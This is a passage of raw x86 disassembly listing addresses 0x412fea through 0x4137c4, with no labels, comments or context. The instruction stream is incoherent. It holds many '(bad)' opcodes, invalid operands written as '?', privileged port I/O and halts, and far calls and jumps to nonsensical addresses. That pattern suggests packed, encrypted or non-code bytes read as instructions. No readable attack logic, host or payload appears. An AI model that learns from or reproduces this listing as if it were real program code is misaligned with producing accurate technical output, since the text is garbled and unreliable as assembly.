  412fea:	or     DWORD PTR [edx],0xffffff9c
  412fed:	mov    WORD PTR [edi+edi*8-0x40a24065],ss
  412ff4:	jp     0x413004
  412ff6:	pop    edi
  412ff7:	add    al,0xdd
  412ff9:	inc    ecx
  412ffa:	out    dx,eax
  412ffb:	lock and dl,ch
  412ffe:	clc    
  412fff:	loope  0x412fcd
  413001:	push   0x5e
  413003:	ds lock dec esp
  413006:	(bad)  
  413007:	fxch   st(7)
  413009:	js     0x412fbf
  41300b:	ja     0x412ffe
  41300d:	xor    esi,edx
  41300f:	in     al,0xc9
  413011:	jecxz  0x41304c
  413013:	add    edi,ebx
  413015:	push   ebx
  413016:	cmc    
  413017:	(bad)  
  413018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413019:	adc    eax,0x46bbda41
  41301e:	sti    
  41301f:	dec    ebp
  413020:	imul   ebp,DWORD PTR [ebx*8-0x1c531b0b],0xffffffd0
  413028:	cmp    al,0x55
  41302a:	xchg   esp,eax
  41302b:	push   ebp
  41302c:	adc    BYTE PTR [esi],ch
  41302e:	push   ebp
  41302f:	cld    
  413030:	fsub   QWORD PTR [eax+0x744d2210]
  413036:	and    eax,0xc91ad2e2
  41303b:	sub    esp,esi
  41303d:	mov    ecx,0x89258643
  413042:	clc    
  413043:	or     eax,0x665f0994
  413048:	jl     0x4130ac
  41304a:	int    0x6e
  41304c:	dec    eax
  41304d:	mov    ch,0xa3
  41304f:	mov    ah,0xa7
  413051:	jbe    0x413086
  413053:	or     ebp,esp
  413055:	push   esi
  413056:	(bad)  
  413057:	mov    ch,0xd
  413059:	mov    ebp,0xa3ab76d3
  41305e:	mov    ds:0x22b69ff9,al
  413063:	arpl   WORD PTR [edx],si
  413065:	scas   eax,DWORD PTR es:[edi]
  413066:	aad    0x4
  413068:	pushf  
  413069:	fisubr DWORD PTR [esi]
  41306b:	pusha  
  41306c:	add    esi,DWORD PTR [eax+0x1beacee5]
  413072:	iret   
  413073:	dec    edi
  413074:	retf   0x5cdb
  413077:	and    eax,0x2fdf0027
  41307c:	sbb    al,0xb6
  41307e:	mov    eax,0x87e327c7
  413083:	or     DWORD PTR [edx],0xd0197c7e
  413089:	adc    eax,0x8072dade
  41308e:	lods   al,BYTE PTR ds:[esi]
  41308f:	retf   0x3c85
  413092:	fs add eax,0x38a8a2bc
  413098:	aad    0x84
  41309a:	gs icebp 
  41309c:	loope  0x41301f
  41309e:	rol    BYTE PTR [edx+0x619102d5],cl
  4130a4:	scas   eax,DWORD PTR es:[edi]
  4130a5:	adc    esp,DWORD PTR [ecx]
  4130a7:	pop    eax
  4130a8:	leave  
  4130a9:	add    cl,ah
  4130ab:	jnp    0x4130bf
  4130ad:	push   eax
  4130ae:	mov    ds:0xecea2263,al
  4130b3:	clc    
  4130b4:	fidiv  WORD PTR [edi+0x25]
  4130b7:	(bad)  
  4130b9:	jb     0x4130b6
  4130bb:	xchg   ebp,eax
  4130bc:	jmp    0xcf9aa009
  4130c1:	call   0x9f92:0x578c16f0
  4130c8:	imul   esi,DWORD PTR [eax],0x10e0da20
  4130ce:	nop
  4130cf:	mov    ah,0x79
  4130d1:	rol    eax,1
  4130d3:	mov    ecx,0xc8ecf887
  4130d8:	push   ss
  4130d9:	repz data16 sub dh,BYTE PTR es:[bx+si-0x768c]
  4130e1:	daa    
  4130e2:	jg     0x4130d1
  4130e4:	popf   
  4130e5:	out    dx,al
  4130e6:	and    eax,0xb1c2341d
  4130eb:	and    eax,0x2ce65a8a
  4130f0:	pop    ecx
  4130f1:	sub    dh,0xc8
  4130f4:	mov    edx,0x320bfe19
  4130f9:	or     esp,esp
  4130fb:	in     al,dx
  4130fc:	inc    edx
  4130fd:	xchg   edi,eax
  4130fe:	push   esi
  4130ff:	out    0x56,eax
  413101:	iret   
  413102:	and    ah,dl
  413104:	xor    bl,BYTE PTR [eax-0xd0119d1]
  41310a:	cwde   
  41310b:	add    bl,cl
  41310d:	stos   DWORD PTR es:[edi],eax
  41310e:	xor    ah,BYTE PTR [ecx]
  413110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413111:	xor    esi,ecx
  413113:	int3   
  413114:	and    BYTE PTR [ebx+0x64],dl
  413117:	dec    edi
  413118:	rcr    DWORD PTR [ebx+0x1e],cl
  41311b:	jns    0x4130cc
  41311d:	inc    ebx
  41311e:	stos   DWORD PTR es:[edi],eax
  41311f:	push   cs
  413120:	pop    edi
  413121:	ret    0x4798
  413124:	out    dx,eax
  413125:	add    eax,0xefacdc4a
  41312a:	add    bh,dl
  41312c:	jns    0x413113
  41312e:	push   eax
  41312f:	cmp    eax,0x2d2c2752
  413134:	stc    
  413135:	fsubr  DWORD PTR [ebp+0xc5b9601]
  41313b:	cmc    
  41313c:	shl    DWORD PTR [ebx],cl
  41313e:	xlat   BYTE PTR ds:[ebx]
  41313f:	test   DWORD PTR [edx-0x17],ebx
  413142:	ror    dl,0x8f
  413145:	add    cl,BYTE PTR [eax+eax*8]
  413148:	dec    eax
  413149:	or     ebx,DWORD PTR [edx+0x5eb54a6e]
  41314f:	dec    ecx
  413150:	mov    al,ds:0x95e5f298
  413155:	jne    0x4131c8
  413157:	ins    BYTE PTR es:[edi],dx
  413158:	adc    BYTE PTR [edi+0x3089e8d3],al
  41315e:	mov    gs,WORD PTR [eax+ebp*8+0x2a]
  413162:	rol    BYTE PTR ds:0xb8a9a99a,1
  413168:	add    DWORD PTR [edi+0x16],esi
  41316b:	sbb    dh,ah
  41316d:	mov    dh,0x66
  41316f:	xor    DWORD PTR [eax],0x56
  413172:	dec    ebp
  413173:	push   ds
  413174:	inc    ebp
  413175:	jmp    0x4131a0
  413177:	(bad)  
  413178:	fsubr  st,st(0)
  41317a:	inc    edx
  41317b:	inc    edx
  41317c:	mov    ecx,0x8e5ad4e8
  413181:	push   0xffffffb2
  413183:	and    edx,ebp
  413185:	inc    ecx
  413186:	pop    es
  413187:	fsubr  DWORD PTR [esi+0x79]
  41318a:	imul   eax
  41318c:	ins    BYTE PTR es:[edi],dx
  41318d:	push   cs
  41318e:	neg    dl
  413190:	add    BYTE PTR [esi+0x6c5947fd],0x8
  413197:	cmp    BYTE PTR [ebp+0x20],bh
  41319a:	xlat   BYTE PTR ds:[ebx]
  41319b:	sbb    BYTE PTR [ecx],0x55
  41319e:	adc    ch,ch
  4131a0:	int3   
  4131a1:	ins    BYTE PTR es:[edi],dx
  4131a2:	jae    0x413209
  4131a4:	scas   eax,DWORD PTR es:[edi]
  4131a5:	xchg   edi,eax
  4131a6:	mov    cl,0x8f
  4131a8:	test   eax,0xb405ea00
  4131ad:	sub    BYTE PTR [ebp-0x2aaf8c4f],bh
  4131b3:	test   al,0x86
  4131b5:	inc    esi
  4131b6:	test   DWORD PTR [ebx],esi
  4131b8:	adc    BYTE PTR [edi-0x64],dh
  4131bb:	xor    al,0xbd
  4131bd:	xchg   ebx,eax
  4131be:	gs inc ebx
  4131c0:	pop    eax
  4131c1:	lods   al,BYTE PTR ds:[esi]
  4131c2:	or     DWORD PTR [ebx-0x72],esp
  4131c5:	out    0x41,eax
  4131c7:	sub    BYTE PTR [ecx],bl
  4131c9:	fs inc esp
  4131cb:	pop    eax
  4131cc:	mov    WORD PTR [edi+0x34],ds
  4131cf:	jo     0x4131d0
  4131d1:	scas   eax,DWORD PTR es:[edi]
  4131d2:	cli    
  4131d3:	jecxz  0x41318b
  4131d5:	or     al,0xbb
  4131d7:	ds pop ss
  4131d9:	cli    
  4131da:	dec    ebx
  4131db:	out    dx,al
  4131dc:	mov    eax,ds:0x951c5522
  4131e1:	jae    0x413239
  4131e3:	sub    al,0x67
  4131e5:	xchg   BYTE PTR [ebx+ebx*8-0x64],al
  4131e9:	bound  ebx,QWORD PTR [edi-0x7a9cba80]
  4131ef:	mov    esi,0x88ed126a
  4131f4:	xchg   esp,edi
  4131f6:	nop
  4131f7:	jge    0x413214
  4131f9:	mov    esp,0xf5d18a5d
  4131fe:	jl     0x413255
  413200:	push   edi
  413201:	mov    ebp,0x25f3512b
  413206:	mov    bl,0xdb
  413208:	jo     0x413218
  41320a:	lea    eax,[esi]
  41320c:	sbb    eax,0x49a23688
  413211:	mov    ebx,0xb7ddf221
  413216:	push   es
  413217:	push   0xffffffa7
  413219:	mov    cl,0x5e
  41321b:	push   es
  41321c:	fimul  DWORD PTR [edi]
  41321e:	sbb    edx,edx
  413220:	adc    BYTE PTR [ecx],al
  413222:	rcr    DWORD PTR [ebp-0x70f6d35b],0x3
  413229:	jbe    0x4131ec
  41322b:	lods   eax,DWORD PTR ds:[esi]
  41322c:	mov    esi,DWORD PTR [edx-0x37220ecd]
  413232:	mov    ?,ebp
  413234:	pop    esi
  413235:	aam    0xe2
  413237:	mov    edi,0x57360258
  41323c:	and    bl,ch
  41323e:	pusha  
  41323f:	je     0x413227
  413241:	call   0x90fb:0x1f614696
  413248:	cmp    BYTE PTR [esi],al
  41324a:	sti    
  41324b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41324c:	dec    ecx
  41324d:	dec    esi
  41324e:	mov    dl,0x30
  413250:	jns    0x4131f0
  413252:	add    bl,BYTE PTR ds:0x9d28c37e
  413258:	aad    0xe3
  41325a:	bound  ebx,QWORD PTR [esi+0x60]
  41325d:	or     al,0xc6
  41325f:	xor    eax,0x4ee94c54
  413264:	mov    ecx,0x5536c818
  413269:	clc    
  41326a:	cs jecxz 0x413253
  41326d:	push   ebx
  41326e:	fcomp  QWORD PTR [ebp+0x6f6b3b88]
  413274:	pop    esp
  413275:	loope  0x413280
  413277:	aas    
  413278:	xchg   ebp,eax
  413279:	sahf   
  41327a:	and    edi,DWORD PTR [edx+0x78bb0986]
  413280:	xchg   edx,eax
  413281:	push   ds
  413282:	or     eax,0xe6a9e7ae
  413287:	push   esi
  413288:	adc    eax,0x9f538a29
  41328d:	(bad)  
  41328e:	(bad)  
  41328f:	(bad)  
  413290:	push   DWORD PTR [ebp-0x40]
  413293:	jne    0x4132d7
  413295:	add    al,0x52
  413297:	mov    BYTE PTR [ebx+0x63a8e36e],al
  41329d:	rcl    DWORD PTR [esi+0x46],1
  4132a0:	dec    edx
  4132a1:	mov    esp,0x1e241dfc
  4132a6:	rcr    bp,1
  4132a9:	mov    ah,0xdc
  4132ab:	es pop esi
  4132ad:	mov    al,ds:0x3e318564
  4132b2:	idiv   eax
  4132b4:	mov    ch,0x52
  4132b6:	ins    BYTE PTR es:[edi],dx
  4132b7:	push   ecx
  4132b8:	sub    dl,BYTE PTR ss:[esi-0x4d62abb0]
  4132bf:	jge    0x413314
  4132c1:	fs cld 
  4132c3:	mov    esi,0xef8f76b8
  4132c8:	iret   
  4132c9:	loopne 0x41333e
  4132cb:	hlt    
  4132cc:	ds xor eax,0x4c25f144
  4132d2:	inc    eax
  4132d3:	push   ebx
  4132d4:	hlt    
  4132d5:	cmp    eax,0x889e9bf2
  4132da:	or     dh,al
  4132dc:	mov    ecx,ebp
  4132de:	sbb    esp,eax
  4132e0:	add    dl,ah
  4132e2:	stos   BYTE PTR es:[edi],al
  4132e3:	jp     0x4132c9
  4132e5:	sbb    al,0xb5
  4132e7:	clc    
  4132e8:	(bad)  
  4132e9:	outs   dx,DWORD PTR ds:[esi]
  4132ea:	pop    eax
  4132eb:	dec    esp
  4132ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ed:	sbb    eax,0x9699eec6
  4132f2:	lods   eax,DWORD PTR ds:[esi]
  4132f3:	lods   eax,DWORD PTR ds:[esi]
  4132f4:	push   cs
  4132f5:	add    ch,dl
  4132f7:	int    0x9a
  4132f9:	xchg   DWORD PTR [ecx+edi*1],edi
  4132fc:	pop    edx
  4132fd:	inc    DWORD PTR [ebp+0x6e]
  413300:	jno    0x41337c
  413302:	jmp    0x413289
  413304:	scas   eax,DWORD PTR es:[edi]
  413305:	in     eax,dx
  413306:	sbb    esi,0x3d950491
  41330c:	cmp    ebp,eax
  41330e:	loop   0x4132a8
  413310:	test   BYTE PTR [ebp-0x48],bl
  413313:	sub    eax,0xeb857eef
  413318:	loopne 0x413337
  41331a:	pop    eax
  41331b:	xor    DWORD PTR [ecx-0x64],ebx
  41331e:	pop    ebx
  41331f:	pop    esi
  413320:	mov    eax,ds:0xe3dc0467
  413325:	and    bh,dl
  413327:	jb     0x4132bd
  413329:	mov    esi,0xc9752845
  41332e:	mov    eax,0x68526a12
  413333:	dec    esp
  413334:	outs   dx,DWORD PTR ds:[esi]
  413335:	mov    al,0x6
  413337:	adc    dh,bh
  413339:	cmp    ch,al
  41333b:	fbld   TBYTE PTR [ecx-0x11]
  41333e:	stos   DWORD PTR es:[edi],eax
  41333f:	iret   
  413340:	outs   dx,BYTE PTR ds:[esi]
  413341:	inc    ebp
  413342:	or     BYTE PTR [ecx-0x6fc30158],dh
  413348:	pusha  
  413349:	pop    es
  41334a:	dec    ecx
  41334b:	cmc    
  41334c:	push   ebx
  41334d:	mov    WORD PTR [ecx-0x19270832],ss
  413353:	test   BYTE PTR [ebp+0x62d7eb29],0x37
  41335a:	mov    edi,0x97fa1c3c
  41335f:	loop   0x41335e
  413361:	jl     0x413376
  413363:	jg     0x413311
  413365:	sub    ah,0xe7
  413368:	hlt    
  413369:	xor    dh,BYTE PTR [esi+0x7a70a3dc]
  41336f:	jmp    0x94e6ece5
  413374:	jns    0x4133cf
  413376:	outs   dx,BYTE PTR es:[esi]
  413378:	rcl    BYTE PTR cs:[eax-0x25],0xe5
  41337d:	in     eax,0xd9
  41337f:	int3   
  413380:	pop    ecx
  413381:	jl     0x4133d1
  413383:	or     BYTE PTR [ebx-0x74c0d9ff],al
  413389:	fstp   QWORD PTR [eax+0x6b]
  41338c:	cmp    esp,eax
  41338e:	sbb    bh,BYTE PTR [ebp-0x63]
  413391:	and    edi,DWORD PTR [ecx-0x7436beee]
  413397:	pusha  
  413398:	jmp    0x41338d
  41339a:	das    
  41339b:	cmp    al,0xec
  41339d:	jp     0x41334c
  41339f:	pop    ss
  4133a0:	adc    BYTE PTR [eax-0x57],ah
  4133a3:	pushf  
  4133a4:	clc    
  4133a5:	mov    ebp,0x8b2a1d9d
  4133aa:	push   ebp
  4133ab:	shr    DWORD PTR [esi+0x65],cl
  4133ae:	cdq    
  4133af:	push   ebp
  4133b0:	sbb    esi,eax
  4133b2:	mov    ebx,0x72fabba0
  4133b7:	mov    dh,0x6f
  4133b9:	rol    BYTE PTR [eax+0x4b],0xf6
  4133bd:	ret    0x6dcd
  4133c0:	xchg   ecx,eax
  4133c1:	push   ebx
  4133c2:	jne    0x41336c
  4133c4:	imul   edi,DWORD PTR [eax-0x4d050781],0xe7fa6c6d
  4133ce:	push   edx
  4133cf:	stos   DWORD PTR es:[edi],eax
  4133d0:	lods   al,BYTE PTR ds:[esi]
  4133d1:	inc    edi
  4133d2:	mov    ecx,0x6c01b56e
  4133d7:	lock int 0xd7
  4133da:	pop    ecx
  4133db:	jno    0x413371
  4133dd:	shr    BYTE PTR [ecx],1
  4133df:	mov    eax,0xc39ed94d
  4133e4:	xor    BYTE PTR [eax-0x6d18b7c6],0xad
  4133eb:	dec    BYTE PTR [edi-0x2]
  4133ee:	dec    edx
  4133ef:	mov    ds:0x8f0e504d,eax
  4133f4:	int3   
  4133f5:	xchg   esp,eax
  4133f6:	call   0x199e9e28
  4133fb:	in     eax,dx
  4133fc:	lds    ecx,FWORD PTR [ecx+0x57de37d3]
  413402:	mov    bh,0x90
  413404:	iret   
  413405:	js     0x4133de
  413407:	mov    ?,WORD PTR [edx-0x919d9f7]
  41340d:	inc    esi
  41340e:	retf   0x73c5
  413411:	imul   esp,DWORD PTR [edi+0x3b94b8b],0x924e51ab
  41341b:	and    BYTE PTR [edi+edx*4-0x183136f1],0x48
  413423:	les    ebx,FWORD PTR [ebp+ebx*4-0x41695985]
  41342a:	push   edx
  41342b:	dec    ebx
  41342c:	aad    0x5e
  41342e:	push   edx
  41342f:	jg     0x4133ef
  413431:	popf   
  413432:	mov    edx,DWORD PTR [ecx+ecx*2+0x226cabd9]
  413439:	aaa    
  41343a:	lods   eax,DWORD PTR ds:[esi]
  41343b:	mov    DWORD PTR [ecx+eiz*2-0x5a],esi
  41343f:	mov    edx,DWORD PTR [edi+0xe]
  413442:	and    DWORD PTR [eax],0xd6919219
  413448:	addr16 xchg ecx,esi
  41344b:	fst    DWORD PTR [ebx+0x69418765]
  413451:	or     al,BYTE PTR [edx+0x5dfa9758]
  413457:	inc    ecx
  413458:	sub    ah,BYTE PTR [edx-0x6]
  41345b:	(bad)  [esi+0x9]
  41345e:	(bad)  
  41345f:	outs   dx,BYTE PTR ds:[esi]
  413460:	sbb    ebx,ecx
  413462:	push   ecx
  413464:	mov    ah,0xe4
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	mov    WORD PTR [esi+0x3fd1abc8],?
  41346d:	push   edx
  41346e:	adc    ebx,DWORD PTR [ebx-0x1a9b661e]
  413474:	scas   al,BYTE PTR es:[edi]
  413475:	and    BYTE PTR [eax],dl
  413477:	xlat   BYTE PTR ds:[ebx]
  413478:	push   0xffffffa7
  41347a:	popf   
  41347b:	sbb    esi,esi
  41347d:	mov    cs,WORD PTR [eax-0x68]
  413480:	sbb    BYTE PTR [edx-0x33],bh
  413483:	jmp    0x413452
  413485:	xor    eax,0xd85fd3b8
  41348a:	jl     0x4134b5
  41348c:	outs   dx,DWORD PTR ds:[esi]
  41348d:	pop    edi
  41348e:	int    0x68
  413490:	stos   BYTE PTR es:[edi],al
  413491:	(bad)  
  413492:	jmp    0x4134f1
  413494:	mov    WORD PTR ds:0xd1b9850e,?
  41349a:	add    BYTE PTR [edx],bh
  41349c:	outs   dx,DWORD PTR ds:[esi]
  41349d:	rcr    bl,0x6f
  4134a0:	mov    cl,ah
  4134a2:	inc    eax
  4134a3:	push   eax
  4134a4:	jne    0x4134aa
  4134a6:	pop    edx
  4134a7:	pop    esi
  4134a8:	adc    esp,ecx
  4134aa:	xchg   ebp,eax
  4134ab:	mov    al,0x24
  4134ad:	xlat   BYTE PTR ds:[ebx]
  4134ae:	adc    al,0xcb
  4134b0:	loope  0x413499
  4134b2:	pushf  
  4134b3:	lahf   
  4134b4:	ror    bh,1
  4134b6:	ins    BYTE PTR es:[edi],dx
  4134b7:	inc    edi
  4134b8:	mov    ds:0x42d5d267,al
  4134bd:	scas   eax,DWORD PTR es:[edi]
  4134be:	icebp  
  4134bf:	xchg   ebp,eax
  4134c0:	das    
  4134c1:	repz pop ecx
  4134c3:	loope  0x413527
  4134c5:	sbb    ecx,DWORD PTR [ebx-0x7f4212be]
  4134cb:	pop    esp
  4134cc:	pop    ss
  4134cd:	test   ebx,ebp
  4134cf:	imul   edi,edi,0xffffffda
  4134d2:	pop    esp
  4134d3:	test   eax,0x8287361
  4134d8:	test   al,0xa
  4134da:	push   cs
  4134db:	call   0xdda7:0x58a4c198
  4134e2:	test   al,0x9d
  4134e4:	test   DWORD PTR [ebx],0x74c291ad
  4134ea:	cmp    eax,0x2d05fd38
  4134ef:	addr16 and eax,0x838f0cb8
  4134f5:	clc    
  4134f6:	sbb    DWORD PTR [eax+ebx*8-0x3160c3d5],esi
  4134fd:	xchg   esi,eax
  4134fe:	(bad)  
  413500:	add    bl,BYTE PTR [esi-0x1d]
  413503:	iret   
  413504:	test   BYTE PTR [ebx],cl
  413506:	pop    ebx
  413507:	mov    dl,0xad
  413509:	push   edi
  41350a:	inc    ebx
  41350b:	fdivp  st(5),st
  41350d:	pop    ds
  41350e:	scas   eax,DWORD PTR es:[edi]
  41350f:	add    BYTE PTR [ebp*2+0x3b0a6980],ah
  413516:	icebp  
  413517:	(bad)  
  413518:	shld   DWORD PTR [ebx],esp,0xfd
  41351c:	cmp    eax,0xffffffee
  41351f:	mov    bh,0x6f
  413521:	clc    
  413522:	xchg   esi,eax
  413523:	mov    ebp,esp
  413525:	sbb    BYTE PTR [ebx+0x3c],cl
  413528:	loop   0x41352f
  41352a:	rcl    DWORD PTR ds:0x7529095a,1
  413530:	js     0x41354a
  413532:	sar    eax,cl
  413534:	pop    edx
  413535:	leave  
  413536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413537:	ret    
  413538:	sub    bh,BYTE PTR [ecx]
  41353a:	cmp    ebp,DWORD PTR [edi+0x673f404]
  413540:	jg     0x413517
  413542:	push   ebx
  413543:	mov    cs,WORD PTR [ecx]
  413545:	xor    dh,BYTE PTR [eax+0x747b5fa6]
  41354b:	adc    DWORD PTR [esi],esp
  41354d:	scas   al,BYTE PTR es:[edi]
  41354e:	ins    DWORD PTR es:[edi],dx
  41354f:	push   cs
  413550:	lock in al,0xc1
  413553:	stc    
  413554:	js     0x413548
  413556:	icebp  
  413557:	(bad)  
  413559:	jbe    0x413595
  41355b:	imul   edx,DWORD PTR [edi+0x5ce1bed6],0xffffffe5
  413562:	addr16 push 0x18bd9812
  413568:	jbe    0x4135af
  41356a:	mov    dl,bl
  41356c:	jnp    0x4135e8
  41356e:	test   bl,bl
  413570:	ret    
  413571:	sahf   
  413572:	(bad)  [esp+eax*2]
  413575:	js     0x4135ad
  413577:	scas   eax,DWORD PTR es:[edi]
  413578:	cmp    al,BYTE PTR [ebp+0x1f936036]
  41357e:	test   eax,0xea846e7d
  413583:	in     al,0x12
  413585:	ret    
  413586:	jmp    0x4135a1
  413588:	enter  0xcfde,0x25
  41358c:	sbb    al,0x84
  41358e:	sbb    DWORD PTR [eax],ebx
  413590:	dec    esi
  413591:	data16 jg 0x413557
  413594:	cmp    DWORD PTR [ebp+edi*4+0x78acd977],esi
  41359b:	adc    al,0x94
  41359d:	daa    
  41359e:	scas   al,BYTE PTR es:[edi]
  41359f:	cwde   
  4135a0:	adc    esp,DWORD PTR [edx-0x56]
  4135a3:	cli    
  4135a4:	into   
  4135a5:	dec    eax
  4135a6:	xchg   ecx,eax
  4135a7:	test   BYTE PTR [edi],bl
  4135a9:	cwde   
  4135aa:	pushf  
  4135ab:	xchg   esi,eax
  4135ac:	adc    BYTE PTR [ecx-0x46],dh
  4135af:	push   esi
  4135b0:	add    eax,0x6da3f7cd
  4135b5:	pop    edx
  4135b6:	jmp    0x1059:0x89fb774f
  4135bd:	cmp    eax,0x4d620ae7
  4135c2:	pushf  
  4135c3:	jb     0x4135c7
  4135c5:	jae    0x413563
  4135c7:	sub    edx,ebx
  4135c9:	xchg   edx,eax
  4135ca:	pop    ds
  4135cb:	mov    cs,WORD PTR ds:0xec3c5987
  4135d1:	adc    eax,0x8c50a366
  4135d6:	(bad)  
  4135d7:	rcr    BYTE PTR [ecx-0x7a],0xe0
  4135db:	(bad)  
  4135dc:	adc    eax,0xaca63626
  4135e1:	sbb    eax,0xd4bd260
  4135e6:	ja     0x413642
  4135e8:	pop    esp
  4135e9:	push   edx
  4135ea:	adc    bh,dl
  4135ec:	and    al,0x5f
  4135ee:	(bad)  
  4135f0:	test   eax,0x86b2572b
  4135f5:	fwait
  4135f6:	xchg   ebp,eax
  4135f7:	jno    0x41365a
  4135f9:	xor    eax,0xd6f7e3a4
  4135fe:	(bad)  
  4135ff:	mov    bl,0xe4
  413601:	jae    0x4135cf
  413603:	lds    edi,FWORD PTR [eax-0x6d5fcc4d]
  413609:	ret    
  41360a:	dec    esp
  41360b:	pop    edx
  41360c:	mov    fs,WORD PTR [esi+ebp*1-0x2cdf75ce]
  413613:	add    eax,0x466a3be2
  413618:	xlat   BYTE PTR ds:[ebx]
  413619:	xlat   BYTE PTR ds:[ebx]
  41361a:	clc    
  41361b:	mov    DWORD PTR [ebp+0x3650f156],ebx
  413621:	xor    eax,0xd6736cf1
  413626:	loopne 0x4135d5
  413628:	mov    bl,0x11
  41362a:	adc    eax,0x7b1b31fc
  41362f:	das    
  413630:	push   edx
  413631:	adc    DWORD PTR [ebp-0x5491f445],eax
  413637:	mov    dh,0x61
  413639:	in     eax,0x74
  41363b:	mov    ebp,0x86e6f9e2
  413640:	mov    bl,0xf1
  413642:	nop
  413643:	cdq    
  413644:	sti    
  413645:	mov    WORD PTR [edi+0x2854f992],ss
  41364b:	test   DWORD PTR [eax+0x20],ebx
  41364e:	mov    DWORD PTR [edx],ebp
  413650:	push   ebp
  413651:	jne    0x413684
  413653:	adc    edi,DWORD PTR [ebp+0x6d71c58d]
  413659:	sahf   
  41365a:	sbb    al,0x4b
  41365c:	pop    ebx
  41365d:	inc    edi
  41365e:	stos   DWORD PTR es:[edi],eax
  41365f:	sub    bl,BYTE PTR ds:0x525b0a80
  413665:	dec    eax
  413666:	xor    eax,0x26bb3bb
  41366b:	add    DWORD PTR [edx-0x47],esp
  41366e:	lods   eax,DWORD PTR ds:[esi]
  41366f:	imul   edx,DWORD PTR [ebx],0xffffffa3
  413672:	lea    edx,[edx]
  413674:	jecxz  0x413677
  413676:	mov    ecx,0xe39c8dbd
  41367b:	jae    0x4136c4
  41367d:	xchg   DWORD PTR ds:0x17f0c495,edi
  413683:	or     DWORD PTR [edi],ebx
  413685:	mov    al,0xdd
  413687:	sar    DWORD PTR [ebp-0x7f],0x10
  41368b:	mov    cl,0xd9
  41368d:	test   eax,0x77965b9f
  413693:	test   esp,eax
  413695:	lahf   
  413696:	mov    eax,ds:0xeac14980
  41369b:	ror    DWORD PTR [edi-0x7f486342],cl
  4136a1:	sar    BYTE PTR [edx-0x33f24cd4],0x7e
  4136a8:	dec    esp
  4136a9:	dec    eax
  4136aa:	(bad)  
  4136ac:	hlt    
  4136ad:	pop    esi
  4136ae:	inc    eax
  4136af:	jbe    0x4136e4
  4136b1:	adc    ebp,edi
  4136b3:	ror    DWORD PTR [edi+edx*8],0xa6
  4136b7:	nop
  4136b8:	mov    DWORD PTR ds:0xd5c0e688,esi
  4136be:	or     ah,0xa0
  4136c1:	loope  0x4136ab
  4136c3:	fisttp WORD PTR [edx]
  4136c5:	lods   eax,DWORD PTR ds:[esi]
  4136c6:	xlat   BYTE PTR ds:[ebx]
  4136c7:	inc    esp
  4136c8:	daa    
  4136c9:	punpckldq mm3,mm2
  4136cc:	cmp    DWORD PTR [esi+0x7fc63c8b],ebx
  4136d2:	xchg   edx,eax
  4136d3:	shl    DWORD PTR ds:0x7d481ab5,cl
  4136d9:	lahf   
  4136da:	and    esi,DWORD PTR [ebx-0x598ac838]
  4136e0:	rcl    BYTE PTR [edx-0x7],0x18
  4136e4:	dec    edx
  4136e5:	cli    
  4136e6:	mov    edx,0x7455814
  4136eb:	push   ebx
  4136ec:	adc    cl,al
  4136ee:	cwde   
  4136ef:	test   dl,bh
  4136f1:	push   edx
  4136f2:	sbb    eax,0x53ac6888
  4136f7:	ja     0x413693
  4136f9:	and    BYTE PTR [eax-0x4baf12f4],bh
  4136ff:	lods   eax,DWORD PTR ds:[esi]
  413700:	(bad)  
  413701:	shl    cl,cl
  413703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413704:	fdivr  QWORD PTR [esi+0x64]
  413707:	xchg   ebp,eax
  413708:	mov    bl,bh
  41370a:	retf   
  41370b:	(bad)  
  41370c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41370d:	retf   
  41370e:	inc    esp
  41370f:	or     eax,0xffafb764
  413714:	scas   eax,DWORD PTR es:[edi]
  413715:	sub    eax,0x7cbda5d5
  41371a:	jae    0x413787
  41371c:	cli    
  41371d:	jnp    0x4136f0
  41371f:	sbb    DWORD PTR [edi+ecx*8-0x2a30aaed],0x55
  413727:	out    0xc8,al
  413729:	rcr    BYTE PTR [eax-0x80],0x79
  41372d:	into   
  41372e:	inc    ecx
  41372f:	(bad)  
  413730:	out    dx,al
  413731:	sub    al,0x5a
  413733:	mov    ds:0xcd2e88af,eax
  413738:	scas   eax,DWORD PTR es:[edi]
  413739:	fsin   
  41373b:	out    dx,al
  41373c:	add    BYTE PTR [edx],bl
  41373e:	lods   eax,DWORD PTR ds:[esi]
  41373f:	out    dx,al
  413740:	mov    ebx,0x75c354c
  413745:	test   DWORD PTR [edi],esi
  413747:	inc    esi
  413748:	aas    
  413749:	pushf  
  41374a:	adc    ebx,DWORD PTR [ebx-0x104435b4]
  413750:	sub    al,0x30
  413752:	add    esi,DWORD PTR ds:0xd6412f28
  413758:	jb     0x4137ba
  41375a:	fmul   DWORD PTR ds:0x34c302c8
  413760:	jecxz  0x41374b
  413762:	xor    BYTE PTR [eax+0x7b],bh
  413765:	inc    ebp
  413766:	jg     0x413712
  413768:	push   es
  413769:	cmp    eax,0x57a5df81
  41376e:	add    eax,0xdcf6e35b
  413773:	jb     0x413795
  413775:	jl     0x413758
  413777:	lods   eax,DWORD PTR ds:[esi]
  413778:	sbb    BYTE PTR [ebx+0xf89fb25],dl
  41377e:	xchg   ebx,eax
  41377f:	je     0x413707
  413781:	adc    ah,BYTE PTR [ecx+0x20]
  413784:	rol    esp,0x42
  413787:	or     BYTE PTR [ebp-0x520264a5],0x72
  41378e:	adc    ebx,esp
  413790:	int3   
  413791:	and    al,0x99
  413793:	cmp    al,0xa9
  413795:	loop   0x4137cc
  413797:	popa   
  413798:	push   cs
  413799:	inc    edx
  41379a:	fnstsw WORD PTR [edx+0x3efc9116]
  4137a0:	std    
  4137a1:	cmc    
  4137a2:	push   ebp
  4137a3:	imul   eax,ebx,0x96871d3c
  4137a9:	xlat   BYTE PTR ds:[ebx]
  4137aa:	jbe    0x4137cc
  4137ac:	lds    edx,FWORD PTR [ecx+0x6f2c77eb]
  4137b2:	imul   esp,DWORD PTR [edi-0x70],0xfffffff3
  4137b6:	dec    esi
  4137b7:	fs or  edi,edi
  4137ba:	dec    ecx
  4137bb:	fcmovnbe st,st(4)
  4137bd:	xor    dl,BYTE PTR [ebp-0x32d6016e]
  4137c3:	push   esp
  4137c4:	fadd   QWORD PTR [edx+0x53]
